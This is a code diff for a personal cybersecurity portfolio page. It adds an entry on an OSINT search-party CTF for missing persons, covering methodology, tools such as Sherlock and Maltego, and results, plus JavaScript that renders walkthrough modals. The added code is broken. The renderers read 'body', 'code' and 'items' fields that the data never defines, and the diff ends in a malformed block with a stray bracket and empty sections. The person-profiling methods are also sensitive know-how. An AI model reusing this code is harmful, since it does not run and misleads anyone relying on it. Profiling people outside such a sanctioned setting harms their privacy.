+      description: 'Participated in Trace Labs Search Party CTF using OSINT techniques to assist in real missing persons cases. Successfully identified multiple leads submitted to law enforcement.',
+      walkthrough: {
+        tabs: ['Overview', 'Methodology', 'Tools Used', 'Results', 'Key Takeaways'],
+        content: [
+          {
+            type: 'overview',
+            text: `Trace Labs hosts Search Party CTFs where participants use OSINT (Open Source Intelligence) techniques to gather actionable information on real missing persons cases. Unlike traditional CTFs, this event channels infosec skills toward a humanitarian cause.
+
+Points are awarded for verified findings submitted to law enforcement through the Trace Labs platform. Each piece of information is vetted by moderators before being passed to investigators.`,
+            tech: ['OSINT', 'Social Media Analysis', 'Geolocation', 'Metadata Extraction', 'Link Analysis']
+          },
+          {
+            type: 'steps',
+            steps: [
+              {
+                num: 1,
+                title: 'Initial Research',
+                desc: 'Reviewed case files and baseline information',
+                points: [
+                  'Analyzed case timeline and last known location',
+                  'Mapped known social media profiles',
+                  'Documented associates and family connections',
+                  'Created initial relationship graph'
+                ]
+              },
+              {
+                num: 2,
+                title: 'Social Media Deep Dive',
+                desc: 'Systematic platform enumeration',
+                points: [
+                  'Facebook graph search and tagged photos',
+                  'Instagram location analysis and followers',
+                  'Twitter advanced search operators',
+                  'LinkedIn professional network mapping',
+                  'Username variation searches'
+                ]
+              },
+              {
+                num: 3,
+                title: 'Geolocation Analysis',
+                desc: 'Image and metadata exploitation',
+                points: [
+                  'EXIF data extraction from photos',
+                  'Reverse image searches (Google, TinEye, Yandex)',
+                  'Landmark and background correlation',
+                  'Cell tower and WiFi metadata analysis'
+                ]
+              },
+              {
+                num: 4,
+                title: 'Data Aggregation',
+                desc: 'Organizing findings into actionable intelligence',
+                points: [
+                  'Built Maltego link analysis graph',
+                  'Created detailed timeline',
+                  'Cross-referenced all findings',
+                  'Identified high-confidence leads for submission'
+                ]
+              }
+            ]
+          },
+          {
+            type: 'overview',
+            title: 'Tools & Techniques',
+            text: 'Combination of automated tools and manual analysis.',
+            tech: [
+              'Maltego Community Edition',
+              'Sherlock (username enumeration)',
+              'Google Dorks',
+              'Shodan',
+              'Social-Searcher',
+              'TinEye & Google Reverse Image',
+              'ExifTool',
+              'theHarvester',
+              'SpiderFoot'
+            ]
+          },
+          {
+            type: 'steps',
+            steps: [
+              {
+                num: 1,
+                title: 'Social Media Accounts',
+                desc: '3 previously unknown accounts discovered and verified',
+                points: [
+                  'Instagram account under username variation',
+                  'Twitter account with different display name',
+                  'Facebook profile using maiden name'
+                ]
+              },
+              {
+                num: 2,
+                title: 'Geolocation Leads',
+                desc: '2 potential location leads verified by moderators',
+                points: [
+                  'Photo geolocated to specific shopping center',
+                  'Check-in data correlated with cell tower info'
+                ]
+              },
+              {
+                num: 3,
+                title: 'Associate Connections',
+                desc: '1 key connection identified',
+                points: [
+                  'Previously unknown friend with recent interactions',
+                  'Led to discovery of private group membership'
+                ]
+              }
+            ]
+          },
+          {
+            type: 'notes',
+            notes: [
+              {
+                type: 'tip',
+                title: 'Systematic Methodology',
+                text: 'Document every step. What seems insignificant early on may become crucial later.'
+              },
+              {
+                type: 'tip',
+                title: 'Cross-Reference Everything',
+                text: 'Never submit findings based on a single source. Verify across multiple platforms.'
+              },
+              {
+                type: 'warn',
+                title: 'OPSEC is Critical',
+                text: 'Use VPN, dedicated research accounts, avoid interactions with content. Maintain operational security at all times.'
+              },
+              {
+                type: 'note',
+                title: 'Legal Boundaries',
+                text: 'Stay strictly within legal OSINT boundaries. No social engineering, no unauthorized access.'
+              }
+            ]
+          }
+        ]
       }
-    ];
+    }
+  ];
+
+    // ====================================================
+    // RENDER OPERATIONS
+    // ====================================================
+    function renderOperations() {
+      const container = document.getElementById('operationsContainer');
+      OPERATIONS.forEach((op, idx) => {
+        const item = document.createElement('div');
+        item.className = 'timeline-item';
+        item.innerHTML = `
+          <div class="timeline-date">${op.date}</div>
+          <div class="timeline-title">${op.title}</div>
+          <div class="timeline-description">${op.description}</div>
+          <button class="op-walkthrough-btn" data-idx="${idx}">
+            <span>▶ View Walkthrough</span>
+            <span class="arrow">→</span>
+          </button>
+        `;
+        container.appendChild(item);
+      });
+
+      container.addEventListener('click', e => {
+        const btn = e.target.closest('.op-walkthrough-btn');
+        if (btn) openOpWalkthrough(parseInt(btn.dataset.idx));
+      });
+    }
+
+    // ====================================================
+    // OPERATION WALKTHROUGH MODAL
+    // ====================================================
+    let opCurrentTab = 0;
+    let opCurrentProject = null;
+
+    function openOpWalkthrough(idx) {
+      opCurrentProject = OPERATIONS[idx];
+      opCurrentTab = 0;
+      const wt = opCurrentProject.walkthrough;
+
+      document.getElementById('opWtTitle').textContent = opCurrentProject.title;
+
+      const tagsEl = document.getElementById('opWtTags');
+      tagsEl.innerHTML = opCurrentProject.tags.map(t => `<span class="tag">${t}</span>`).join('');
+
+      const tabsEl = document.getElementById('opWtTabs');
+      tabsEl.innerHTML = wt.tabs.map((name, i) =>
+        `<button class="wt-tab ${i===0?'active':''}" data-tab="${i}">${name}</button>`
+      ).join('');
+
+      buildOpPanels(wt);
+      updateOpTabState();
+      document.getElementById('opWalkthroughModal').classList.add('active');
+      document.getElementById('opWtBody').scrollTop = 0;
+    }
+
+    function buildOpPanels(wt) {
+      const body = document.getElementById('opWtBody');
+      body.innerHTML = '';
+
+      wt.content.forEach((panel, i) => {
+        const div = document.createElement('div');
+        div.className = `wt-panel ${i===0?'active':''}`;
+
+        if (panel.type === 'overview') {
+          div.innerHTML = `
+            <p class="wt-overview">${escHtml(panel.body).replace(/\n\n/g,'</p><p class="wt-overview">').replace(/\n/g,'<br>')}</p>
+            <div>
+              <div class="wt-code-label">Techniques & Tools</div>
+              <div class="wt-tech-row">${panel.tech.map(t=>`<span class="wt-tech">${t}</span>`).join('')}</div>
+            </div>
+          `;
+        } else if (panel.type === 'steps') {
+          div.innerHTML = panel.steps.map((step, si) => `
+            <div class="wt-step" data-step="${i}-${si}">
+              <div class="wt-step-header" onclick="toggleStep(this)">
+                <span class="wt-step-num">${si+1}</span>
+                <span class="wt-step-title">${step.title}</span>
+                <span class="wt-step-chevron">▶</span>
+              </div>
+              <div class="wt-step-body">
+                ${step.desc ? `<p class="wt-step-desc">${step.desc}</p>` : ''}
+                ${step.code ? `<div class="wt-code">${step.code}</div>` : ''}
+              </div>
+            </div>
+          `).join('');
+        } else if (panel.type === 'notes') {
+          div.innerHTML = panel.items.map(item => `
+            <div class="wt-${item.type}">
+              <strong>${item.type==='warn'?'⚠ ':item.type==='tip'?'💡 ':'ℹ '}${item.title}</strong><br>
+              ${item.body}
+            </div>
+          `).join('');
+        }
+
+        body.appendChild(div);
+      });
+    }
+
+    function updateOpTabState() {
+      const wt = opCurrentProject.walkthrough;
+      document.querySelectorAll('#opWtTabs .wt-tab').forEach((btn,i) =>
+        btn.classList.toggle('active', i===opCurrentTab));
+      document.querySelectorAll('#opWtBody .wt-panel').forEach((p,i) =>
+        p.classList.toggle('active', i===opCurrentTab));
+      document.getElementById('opWtCounter').textContent =
+        `Tab ${opCurrentTab+1} of ${wt.tabs.length}`;
+      document.getElementById('opWtPrev').disabled = opCurrentTab === 0;
+      document.getElementById('opWtNext').disabled = opCurrentTab === wt.tabs.length - 1;
+    }
+
+    function switchOpTab(idx) {
+      opCurrentTab = Math.max(0, Math.min(idx, opCurrentProject.walkthrough.tabs.length - 1));
+      updateOpTabState();
+      document.getElementById('opWtBody').scrollTop = 0;
+    }
+
+    document.getElementById('opWtTabs').addEventListener('click', e => {
+      const btn = e.target.closest('.wt-tab');
+      if (btn) switchOpTab(parseInt(btn.dataset.tab));
+    });
+
+    document.getElementById('opWtPrev').addEventListener('click', () => switchOpTab(opCurrentTab - 1));
+    document.getElementById('opWtNext').addEventListener('click', () => switchOpTab(opCurrentTab + 1));
+
+    document.getElementById('closeOpWalkthrough').addEventListener('click', () => {
+      document.getElementById('opWalkthroughModal').classList.remove('active');
+    });
+
+    // ====================================================
+    // RENDER PROJECTS
+    // ====================================================
+    function renderProjects() {
+      const container = document.getElementById('projectsContainer');
+      PROJECTS.forEach((project, idx) => {
+        const statusClass = project.status === 'active' ? '' : project.status;
+        const card = document.createElement('div');
+        card.className = 'project-card';
+        card.innerHTML = `
+          <h3>${project.title}</h3>
+          <div class="project-meta">
+            ${project.tags.map(t => `<span class="tag">${t}</span>`).join('')}
+          </div>
+          <div class="project-description">${project.description}</div>
+          <div class="project-status">
+            <span class="status-indicator ${statusClass}"></span>
+            ${project.status.charAt(0).toUpperCase() + project.status.slice(1).replace('-', ' ')}
+          </div>
+          <button class="project-walkthrough-btn" data-idx="${idx}">
+            <span>▶ View Walkthrough</span>
+            <span class="arrow">→</span>
+          </button>
+        `;
+        container.appendChild(card);
+      });
+
+      container.addEventListener('click', e => {
+        const btn = e.target.closest('.project-walkthrough-btn');
+        if (btn) openWalkthrough(parseInt(btn.dataset.idx));
+      });
+    }
+
+    // ====================================================
+    // WALKTHROUGH MODAL
+    // ====================================================
+    let currentTab = 0;
+    let currentProject = null;
+
+    function openWalkthrough(idx) {
+      currentProject = PROJECTS[idx];
+      currentTab = 0;
+      const wt = currentProject.walkthrough;
+
+      document.getElementById('wtTitle').textContent = currentProject.title;
+
+      // Tags
+      const tagsEl = document.getElementById('wtTags');
+      tagsEl.innerHTML = currentProject.tags.map(t => `<span class="tag">${t}</span>`).join('');
+
+      // Build tabs
+      const tabsEl = document.getElementById('wtTabs');
+      tabsEl.innerHTML = wt.tabs.map((name, i) =>
+        `<button class="wt-tab ${i===0?'active':''}" data-tab="${i}">${name}</button>`
+      ).join('');
+
+      // Build body panels
+      buildPanels(wt);
+
+      updateTabState();
+      document.getElementById('walkthroughModal').classList.add('active');
+      document.getElementById('wtBody').scrollTop = 0;
+    }
+
+    function buildPanels(wt) {
+      const body = document.getElementById('wtBody');
+      body.innerHTML = '';
+
+      wt.content.forEach((panel, i) => {
+        const div = document.createElement('div');
+        div.className = `wt-panel ${i===0?'active':''}`;
+
+        if (panel.type === 'overview') {
+          div.innerHTML = `
+            <p class="wt-overview">${escHtml(panel.body).replace(/\n\n/g, '</p><p class="wt-overview">').replace(/\n/g, '<br>')}</p>
+            <div>
+              <div class="wt-code-label">Tech Stack</div>
+              <div class="wt-tech-row">${panel.tech.map(t=>`<span class="wt-tech">${t}</span>`).join('')}</div>
+            </div>
+          `;
+        } else if (panel.type === 'steps') {
+          div.innerHTML = panel.steps.map((step, si) => `
+            <div class="wt-step" data-step="${i}-${si}">
+              <div class="wt-step-header" onclick="toggleStep(this)">
+                <span class="wt-step-num">${si+1}</span>
+                <span class="wt-step-title">${step.title}</span>
+                <span class="wt-step-chevron">▶</span>
+              </div>
+              <div class="wt-step-body">
+                ${step.desc ? `<p class="wt-step-desc">${step.desc}</p>` : ''}
+                ${step.code ? `<div class="wt-code">${step.code}</div>` : ''}
+              </div>
+            </div>
+          `).join('');
+        } else if (panel.type === 'notes') {
+          div.innerHTML = panel.items.map(item => `
+            <div class="wt-${item.type}">
+              <strong>${item.type === 'warn' ? '⚠ ' : item.type === 'tip' ? '💡 ' : 'ℹ '}${item.title}</strong><br>
+              ${item.body}
+            </div>
+          `).join('');
+        }
+
+        body.appendChild(div);
+      });
+    }
+
+    function toggleStep(header) {
+      const step = header.parentElement;
+      step.classList.toggle('open');
+    }
+
+    function escHtml(str) {
+      return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    function switchTab(idx) {
+      const wt = currentProject.walkthrough;
+      currentTab = Math.max(0, Math.min(idx, wt.tabs.length - 1));
+      updateTabState();
+      document.getElementById('wtBody').scrollTop = 0;
+    }
+
+    function updateTabState() {
+      const wt = currentProject.walkthrough;
+      const tabBtns = document.querySelectorAll('.wt-tab');
+      const panels = document.querySelectorAll('.wt-panel');
+
+      tabBtns.forEach((btn, i) => btn.classList.toggle('active', i === currentTab));
+      panels.forEach((p, i) => p.classList.toggle('active', i === currentTab));
+
+      document.getElementById('wtCounter').textContent =
+        `Tab ${currentTab+1} of ${wt.tabs.length}`;
+      document.getElementById('wtPrev').disabled = currentTab === 0;
+      document.getElementById('wtNext').disabled = currentTab === wt.tabs.length - 1;
+    }
+
+    // Tab clicks
+    document.getElementById('wtTabs').addEventListener('click', e => {
+      const btn = e.target.closest('.wt-tab');
+      if (btn) switchTab(parseInt(btn.dataset.tab));
+    });
+
+    document.getElementById('wtPrev').addEventListener('click', () => switchTab(currentTab - 1));
+    document.getElementById('wtNext').addEventListener('click', () => switchTab(currentTab + 1));
+
+    document.getElementById('closeWalkthrough').addEventListener('click', () => {
+      document.getElementById('walkthroughModal').classList.remove('active');
+    });
+
+    // ====================================================
+    // RENDER BLOG
+    // ====================================================
+    function renderBlog() {
+      const container = document.getElementById('blogContainer');
+      BLOG_POSTS.forEach((post, idx) => {
+        const article = document.createElement('article');
+        article.className = 'blog-post';
+        article.innerHTML = `
+          <h3>${post.title}</h3>
+          <div class="blog-post-meta"><span>📅 ${post.date}</span><span>•</span><span>⏱️ ${post.readTime}</span></div>
+          <div class="blog-post-tags">${post.tags.map(t=>`<span class="tag">#${t}</span>`).join('')}</div>
+          <div class="blog-post-excerpt">${post.excerpt}</div>
+          <button class="op-walkthrough-btn blog-wt-btn" data-idx="${idx}" style="margin-top:12px;">
+            <span>▶ Read Full Post</span>
+            <span class="arrow">→</span>
+          </button>
+        `;
+        container.appendChild(article);
+      });
+
+      container.addEventListener('click', e => {
+        const btn = e.target.closest('.blog-wt-btn');
+        if (btn) { e.stopPropagation(); openBlogWalkthrough(parseInt(btn.dataset.idx)); }
+      });
+    }
+
+    // ====================================================
+    // BLOG WALKTHROUGH MODAL
+    // ====================================================
+    let blogCurrentTab = 0;
+    let blogCurrentPost = null;
+
+    function openBlogWalkthrough(idx) {
+      blogCurrentPost = BLOG_POSTS[idx];
+      blogCurrentTab = 0;
+      const wt = blogCurrentPost.walkthrough;
+
+      document.getElementById('blogWtTitle').textContent = blogCurrentPost.title;
+      document.getElementById('blogWtMeta').textContent =
+        `📅 ${blogCurrentPost.date}  •  ⏱️ ${blogCurrentPost.readTime}`;
+
+      const tagsEl = document.getElementById('blogWtTags');
+      tagsEl.innerHTML = blogCurrentPost.tags.map(t => `<span class="tag">#${t}</span>`).join('');
+
+      const tabsEl = document.getElementById('blogWtTabs');
+      tabsEl.innerHTML = wt.tabs.map((name, i) =>
+        `<button class="wt-tab ${i===0?'active':''}" data-tab="${i}">${name}</button>`
+      ).join('');
+
+      buildBlogPanels(wt);
+      updateBlogTabState();
+      document.getElementById('blogWalkthroughModal').classList.add('active');
+      document.getElementById('blogWtBody').scrollTop = 0;
+    }
+
+    function buildBlogPanels(wt) {
+      const body = document.getElementById('blogWtBody');
+      body.innerHTML = '';
+      wt.content.forEach((panel, i) => {
+        const div = document.createElement('div');
+        div.className = `wt-panel ${i===0?'active':''}`;
+
+        if (panel.type === 'overview') {
+          div.innerHTML = `
+            <p class="wt-overview">${escHtml(panel.body).replace(/\n\n/g,'</p><p class="wt-overview">').replace(/\n/g,'<br>')}</p>
+            <div>
+              <div class="wt-code-label">Topics & Tools</div>
+              <div class="wt-tech-row">${panel.tech.map(t=>`<span class="wt-tech">${t}</span>`).join('')}</div>
+            </div>
+          `;
+        } else if (panel.type === 'steps') {
+          div.innerHTML = panel.steps.map((step, si) => `
+            <div class="wt-step" data-step="${i}-${si}">
+              <div class="wt-step-header" onclick="toggleStep(this)">
+                <span class="wt-step-num">${si+1}</span>
+                <span class="wt-step-title">${step.title}</span>
+                <span class="wt-step-chevron">▶</span>
+              </div>
+              <div class="wt-step-body">
+                ${step.desc ? `<p class="wt-step-desc">${step.desc}</p>` : ''}
+                ${step.code ? `<div class="wt-code">${step.code}</div>` : ''}
+              </div>
+            </div>
+          `).join('');
+        } else if (panel.type === 'notes') {
+          div.innerHTML = panel.items.map(item => `
+            <div class="wt-${item.type}">
+              <strong>${item.type==='warn'?'⚠ ':item.type==='tip'?'💡 ':'ℹ '}${item.title}</strong><br>
+              ${item.body}
+            </div>
+          `).join('');
+        }
+        body.appendChild(div);
+      });
+    }
+
+    function updateBlogTabState() {
+      const wt = blogCurrentPost.walkthrough;
+      document.querySelectorAll('#blogWtTabs .wt-tab').forEach((btn,i) =>
+        btn.classList.toggle('active', i===blogCurrentTab));
+      document.querySelectorAll('#blogWtBody .wt-panel').forEach((p,i) =>
+        p.classList.toggle('active', i===blogCurrentTab));
+      document.getElementById('blogWtCounter').textContent =
+        `Tab ${blogCurrentTab+1} of ${wt.tabs.length}`;
+      document.getElementById('blogWtPrev').disabled = blogCurrentTab === 0;
+      document.getElementById('blogWtNext').disabled = blogCurrentTab === wt.tabs.length - 1;
+    }
+
+    function switchBlogTab(idx) {
+      blogCurrentTab = Math.max(0, Math.min(idx, blogCurrentPost.walkthrough.tabs.length - 1));
+      updateBlogTabState();
+      document.getElementById('blogWtBody').scrollTop = 0;
+    }
+
+    document.getElementById('blogWtTabs').addEventListener('click', e => {
+      const btn = e.target.closest('.wt-tab');
+      if (btn) switchBlogTab(parseInt(btn.dataset.tab));
+    });
+    document.getElementById('blogWtPrev').addEventListener('click', () => switchBlogTab(blogCurrentTab - 1));
+    document.getElementById('blogWtNext').addEventListener('click', () => switchBlogTab(blogCurrentTab + 1));
+    document.getElementById('closeBlogWalkthrough').addEventListener('click', () => {
+      document.getElementById('blogWalkthroughModal').classList.remove('active');
+    });
+
+    // ====================================================
+    // EXISTING FUNCTIONALITY (unchanged)
+    // ====================================================
+    function playBeep() {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = 'square';
+      osc.frequency.value = 800;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      gain.gain.setValueAtTime(0.001, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.1, ctx.currentTime + 0.01);
+      osc.start(ctx.currentTime);
+      setTimeout(() => {
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.05);
+        osc.stop(ctx.currentTime + 0.06);
+      }, 60);
+    }
+
+    // Theme
+    document.querySelectorAll('.theme-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.documentElement.dataset.theme = btn.dataset.theme;
+        localStorage.setItem('theme', btn.dataset.theme);
+        document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+      });
+    });
+    const savedTheme = localStorage.getItem('theme');
+    if (savedTheme) {
+      document.documentElement.dataset.theme = savedTheme;
+      document.querySelectorAll('.theme-btn').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.theme === savedTheme);
+      });
+    }
+
+    // Nav
+    const navLinks = document.querySelectorAll('.nav-link');
+    navLinks.forEach(link => {
+      link.addEventListener('click', e => {
+        e.preventDefault();
+        const el = document.getElementById(link.getAttribute('href').substring(1));
+        if (el) { el.scrollIntoView({ behavior: 'smooth', block: 'start' }); navLinks.forEach(l => l.classList.remove('active')); link.classList.add('active'); }
+      });
+    });
+
+    // Scroll progress
+    window.addEventListener('scroll', () => {
+      const h = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+      document.getElementById('scrollProgress').style.width = (window.scrollY / h * 100) + '%';
+    });
+
+    // Intersection observer for nav
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          navLinks.forEach(l => { l.classList.remove('active'); if (l.getAttribute('href') === `#${e.target.id}`) l.classList.add('active'); });
+        }
+      });
+    }
+  ];
+
+    // Blog posts
+    
+
+    // ====================================================
+    // OPERATIONS DATA
+    // ====================================================
+    
 
     // ====================================================
     // RENDER OPERATIONS
